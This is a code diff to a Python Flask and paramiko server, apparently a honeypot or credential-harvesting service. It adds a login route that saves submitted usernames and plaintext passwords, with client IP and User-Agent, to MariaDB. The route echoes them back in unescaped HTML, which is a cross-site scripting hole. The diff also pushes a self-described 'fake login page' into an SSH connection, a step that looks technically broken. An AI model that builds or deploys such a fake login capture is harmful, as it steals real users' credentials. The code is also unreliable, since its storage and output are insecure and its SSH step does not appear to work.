@@ -2,14 +2,26 @@ import socket
 import paramiko
 import threading
 import pymysql.cursors
-from typing import Union
-from flask import Flask
+from flask import Flask, request
 
 app = Flask(__name__)
 
 @app.route('/health')
 def health_check():
     return 'OK'
+
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+    client_ip = request.remote_addr
+    client_os = request.headers.get('User-Agent')
+
+    # Save the login details to MariaDB
+    save_login_details(username, password, client_ip, client_os)
+
+    # Display the login details
+    return f"Username: {username}<br>Password: {password}<br>IP Address: {client_ip}<br>OS: {client_os}"
 
 class SSHServer(paramiko.ServerInterface):
     def check_auth_password(self, username: str, password: str) -> int:
@@ -18,10 +30,6 @@ class SSHServer(paramiko.ServerInterface):
 
         # Extract client operating system from self.client_os
         client_os = self.client_os
-
-        # Print the client details
-        print(f"Client IP: {client_ip}")
-        print(f"Operating System: {client_os}")
 
         # Save the client details to MariaDB
         save_to_database(client_ip, client_os)
@@ -39,6 +47,14 @@ def handle_connection(client_sock: socket.socket) -> None:
     ssh.client_os = client_sock.recv(2048).decode('utf-8')
 
     ssh.set_server(transport)
+
+    # Read the contents of the index.html file
+    with open('static/index.html', 'r') as file:
+        login_page = file.read()
+
+    # Send the fake login page to the client
+    transport.send(login_page)
+
     transport.start_server(server=ssh)
 
 def save_to_database(client_ip: str, client_os: str) -> None:
